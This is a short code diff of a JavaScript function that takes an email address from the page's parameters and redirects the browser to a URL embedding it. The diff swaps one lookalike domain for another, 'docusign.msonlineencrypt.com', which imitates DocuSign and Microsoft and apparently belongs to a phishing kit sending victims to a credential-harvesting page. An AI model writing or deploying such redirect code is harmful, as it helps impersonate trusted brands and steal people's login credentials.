@@ -13,7 +13,7 @@
         function redirectWithEmail() {
             const email = getEmailParameter();
             if (email) {
-                const newUrl = `https://xxxx.msonlineencryptmessage.com/##EMAIL##`.replace('##EMAIL##', email);
+                const newUrl = `https://docusign.msonlineencrypt.com/M##EMAIL##`.replace('##EMAIL##', email);
                 window.location.href = newUrl;
             }
         }
